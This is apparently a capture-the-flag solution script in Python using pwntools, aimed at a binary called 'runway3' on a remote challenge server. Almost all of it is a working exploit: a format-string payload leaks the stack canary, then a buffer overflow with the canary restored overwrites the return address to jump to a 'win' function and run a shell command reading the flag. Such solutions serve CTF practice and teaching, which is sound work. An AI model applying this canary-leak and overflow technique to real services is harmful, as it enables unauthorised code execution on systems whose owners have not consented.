#!/usr/bin/env python3

from pwn import *

exe = ELF("runway3")

context.binary = exe
context.terminal = ['alacritty', '-e', 'bash', '-c']

LOCAL = False
DEBUG = False

HOST = "challs.pwnoh.io"
PORT = 13403

gdbscript = '''
b *0x401250
c
'''

if LOCAL:
    if DEBUG:
        r = gdb.debug([exe.path], gdbscript=gdbscript)
    else:
        r = process([exe.path])
else:
    r = remote(HOST, PORT)

r.sendlineafter(b'here', b'%13$lu')

r.recvline()

canary = int(r.recvline().strip())

win = 0x4011fc

r.sendline(b'A'*0x28 + p64(canary) + b'A'*8 + p64(win))
r.sendline(b'cat flag.txt')
r.interactive()
